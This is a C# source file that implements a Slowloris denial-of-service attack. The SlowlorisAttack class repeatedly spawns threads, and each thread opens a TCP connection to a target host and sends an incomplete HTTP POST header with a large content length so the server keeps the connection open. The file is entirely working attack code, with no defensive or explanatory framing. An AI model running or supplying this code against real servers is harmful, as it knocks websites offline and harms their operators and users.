using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace SlowLoris
{
    class SlowlorisAttack
    {
        public bool Loop = false;
        public string Website;
        public int Count = 0;
        public int Port;
        public int ThreadSleep;
        public int Id;
       


        public SlowlorisAttack(string host, int port , int threadSleep , bool loop, int id)
        {
            Website = host;
            this.Port = port;
            this.Loop = loop;
            this.ThreadSleep = threadSleep;
            Id = id;
        }

        public void Manage()
        {
            try
            {
                ThreadStart start = null;
                List<TcpClient> clients = new List<TcpClient>();

                while (Loop)
                {

                    if (start == null)
                    {
                       
                        start = delegate
                        {
                            TcpClient item = new TcpClient();
                            clients.Add(item);
                          
                            try
                            {
                                item.Connect(Website, Port);
                                StreamWriter writer = new StreamWriter(item.GetStream());
                                writer.Write("POST / HTTP/1.1\r\nHost: " + Website + "\r\nContent-length: 5235\r\n\r\n");
                                writer.Flush();
                                if (Loop)
                                {
                                    Log("Send: '" + Count + "' by '" + Id +  "' to '" + Port + "'");
                                 
                                }
                                Count++;

                            }
                            catch(Exception ex)
                            {
                                if (Loop)
                                {
                                    Log("Unable to connect");
                                }
                                Console.WriteLine(ex.Message);
                                Loop = false;
                            }
                        };
                    }

                    new Thread(start).Start();
                    Thread.Sleep(ThreadSleep);
                }

                foreach (TcpClient client in clients)
                {
                    
                    try
                    {
                        client.GetStream().Dispose();
                    }
                    catch(Exception ex)
                    {
                        Console.WriteLine(ex.Message + "| " + ex.StackTrace);
                    }
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        /// <summary>
        /// Logging message
        /// </summary>
        /// <param name="msg"></param>
        private void Log(string msg)  => Console.WriteLine("[" + DateTime.Now  + "] " + msg);
     
    }
}
